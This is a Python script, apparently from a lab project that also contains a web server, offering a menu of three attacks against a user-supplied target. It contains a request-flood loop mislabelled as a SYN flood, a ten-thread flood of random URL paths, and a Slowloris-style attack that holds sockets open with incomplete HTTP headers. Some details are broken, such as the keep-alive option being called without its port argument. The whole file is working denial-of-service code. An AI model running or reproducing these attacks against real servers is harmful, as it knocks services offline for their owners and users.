from web_server import log
from Logger import LogType
import requests
import random
import string 
import threading
import time 
import socket

FILE_NAME = "attack_service.py:"

# global param that controls the thread execution
stop_event = threading.Event()

def syn_flood_attack(target_ip:str, port:str):
    '''
    Function that implements the syn flood attack on the web_server
    '''

    log.add_log(f"{FILE_NAME} Starting syn flood attack", LogType.INFO)
    while not stop_event.is_set():
        try:
            requests.get(f"http://{target_ip}:{port}/", timeout=2)

        except Exception as e:
            log.add_log(f"{FILE_NAME} SYN flood error: {e}", LogType.ERROR)
    
    log.add_log(f"{FILE_NAME} Ending syn flood attack", LogType.INFO)


def attack(target:str, paths: list):
    '''
    send 1000 requests of random urls
    '''
    while not stop_event.is_set():
        path = random.choice(paths)
        try:
            requests.get(f"{target}/{path}", timeout=2)
        except Exception as e:
            log.add_log(f"{FILE_NAME} URL brute force error: {e}", LogType.ERROR)

def url_brute_force_attack(target:str):
    '''
    Function that implements the URL brute force attack on the web_server
    It creates 10 threads that each one try to send 1000 get requests of random paths
    (generated by 5 ascii letters splitted with /, for example: x/j/k/r/f) 
    '''

    log.add_log(f"{FILE_NAME} starting url brute force attack", LogType.INFO)
    
    # Create a list of 1000 random paths 
    paths = []
    for _ in range(1000):
        random_letters = random.choices(string.ascii_lowercase, k=5) # Generate a list of 5 random lowercase letters
        random_path = '/'.join(random_letters)
        paths.append(random_path)

    # Create 10 threads and add them to the list
    threads = []
    for _ in range(10):
        thread = threading.Thread(target=attack, args=(target, paths))
        threads.append(thread)
        thread.start() # Start the attack
    
    log.add_log(f"{FILE_NAME} 10 threads started the brute force attack", LogType.INFO)
    
    # Wait for user to stop the attack
    try:
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        log.add_log(f"{FILE_NAME} Stopping URL brute force attack", LogType.ERROR)
        stop_event.set()
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join()
    
    log.add_log(f"{FILE_NAME} Ending URL brute force attack", LogType.INFO)

def http_keep_alive_attack(target: str, port: int, num_connections=5):
    """
    Send incomplete headers to keep the connection open indefinitely, limited to a specified number of connections.
    """
    log.add_log(f"{FILE_NAME} Starts HTTP keep-alive attack", LogType.INFO)
    
    try:
        # Create a limited number of sockets
        sockets = []
        for _ in range(num_connections):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            sockets.append(s)

        request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\n"
        while not stop_event.is_set():
            for s in sockets:
                s.send(request.encode())  # Send the incomplete request to each socket
            time.sleep(1)
    except Exception as e:
        log.add_log(f"{FILE_NAME} Error: {e}", LogType.ERROR)

if __name__ == '__main__':
    print("Select attack type:")
    print("1. SYN Flood")
    print("2. URL Brute-Force")
    print("3. HTTP Keep-alive")

    choice = input("Enter choice (1/2/3): ")
    target = input("Enter target IP/URL: ")

    try:
        if choice == '1':
            syn_flood_attack(target, 8080)
        elif choice == '2':
            url_brute_force_attack(target)
        elif choice == '3':
            http_keep_alive_attack(target)
        else:
            log.add_log(f"{FILE_NAME} User chose invalid choice", LogType.ERROR)
            print("Invalid choice")

    except KeyboardInterrupt as e:
        print("Stopping attack...")
        log.add_log(f"{FILE_NAME} Stopping the attack", LogType.ERROR)
        stop_event.set()

    except Exception as e:
        log.add_log(f"{FILE_NAME} Error: {e}", LogType.ERROR)